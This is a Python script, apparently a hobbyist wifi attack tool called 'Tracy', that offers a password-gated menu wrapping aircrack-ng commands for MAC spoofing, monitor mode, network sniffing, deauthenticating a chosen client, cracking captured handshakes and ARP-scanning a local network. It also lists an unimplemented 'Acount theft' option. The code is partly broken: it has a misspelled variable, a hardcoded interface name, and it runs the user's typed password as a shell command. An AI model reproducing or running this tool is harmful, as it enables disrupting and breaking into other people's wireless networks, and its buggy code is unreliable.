import subprocess
import optparse
import  scapy.all as scapy

def tracy_name():
    name_tracy = """
  TTTTT   rrrrr    aaaa   cccccc  yyyyy   
    TT    r    r  aa  aa  cc    c   y  y   /\_/
    TT    r    r aa    aa cc        yyy   ( o.o ) 
    TT    rrrrr  aaaaaaaa cc        yyy    > ^ <    
    TT    r    r aa    aa cc    c    y     
    TT    r    r aa    aa  cccccc   y     
    """
    print(name_tracy)

def privacity():
    try_password=input('password to enter >')
    password=""
    if try_password == password:
        list_options=['1: Change your mac_Address', '2: Put in mode MONITOR', '3: look at all the WIFI','4: Deuth device of one red','5: Attack password','6: who is in your wifi','7:Acount theft ']
        for element in list_options:
            print(element)
        options=input('cat: choose the option putting the number >')
        if options == "1":
            interface=input('what is your interface? >')
            if not interface:
                print('there is no interface')
            else:

                mac_address=input("what mac_address would you like have? >")
                subprocess.call(["ifconfig", interface , "down"])
                subprocess.call(["ifconfig", interface , "hw", "ether" , mac_address])
                subprocess.call(["ifconfig", interface , "up"])
                print("mac changed")

        if options =='2':
            interface=input('what is your interface? >')
            if not interface:
                print("there is no interface")
            else: 

                subprocess.call(['ifconfig', interface , "down"])
                subprocess.call(["airmon-ng" , "check kill"])
                subprocess.call(['ifconfig', interface , "down"])
                subprocess.call(['iwconfig', interface , "mode" , "monitor"])
                print("interface changed to mode monitor successful")

        if options == '3':
            interface=input('what is your interface? >')
            if not interface:
                print("there is no interface")
            else: 
                admin=input('Write yout password')
                subprocess.call(['sudo','su'])
                subprocess.call([admin])
                subprocess.call(['ifconfig', interface , "down"])
                subprocess.call(["airmon-ng" , "check kill"])
                subprocess.call(['ifconfig', interface , "down"])
                subprocess.call(['iwconfig', interface , "mode" , "monitor"])
                subprocess.call(['airodump-ng', 'wlp2s0'])
        if options =='4':
            interface=input('what is yout interface >')
            if not interface:
                print("there is no interface")
            else:
                a_mac=input("what is your addrees mac >")
                subprocess.call(['ifconfig', interface, 'down'])
                subprocess.call(['airmon-ng', 'check', 'kill'])
                subprocess.call(['ifconfig', interface, 'down'])
                subprocess.call(['iwconfig',interface, 'mode' , 'monitor' ])
                if not a_mac:
                    print('There is no your mac_address')
                else:
                    c_mac=input("what is the mac of the other wifi >")  
                    if not c_mac:
                        print('there is no his mac_address')
                    else:
                        deauth=input("time to keep deauth")
                        if not deauth:
                            print("there is no time to deauth")
                        else:
                            subprocess.call(['aireplay-ng','--deauth', deauth , '-a', a_mac, '-c', c_mac, interface ])
            

        if options == '5':
            name_Document=input('Write the name of the document > ')
            if not name_Document:
                print('there is no the name_document')
            else:
                nameyour_docuemnt=input('Write the name of >')
                if not nameyour_docuemnt:
                    print('there is no nameyour_document')
                else:
                    subprocess.call(['aircrack-ng', name_Document, nameyour_document])
        if options == '6':
            firts_ip=input('Write the ip of router >')
            if not firts_ip:
                print('there is no your firts_ip')
            else:
                def scan(ip):
                    request=scapy.ARP(pdst=ip)
                    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
                    arp_reques_broadcast=broadcast/request
                    answered,unanswered=scapy.srp(arp_reques_broadcast, timeout=10)   
                    print("IP\t\t\tMAC address\n----------------------------------------------")
                    for element in answered:
                        print(element[1].psrc + "\t\t" + element[1].hwsrc )



                scan(firts_ip)
             
                                 
    else:
        print("password incorrect")  
    

           




tracy_name()
privacity()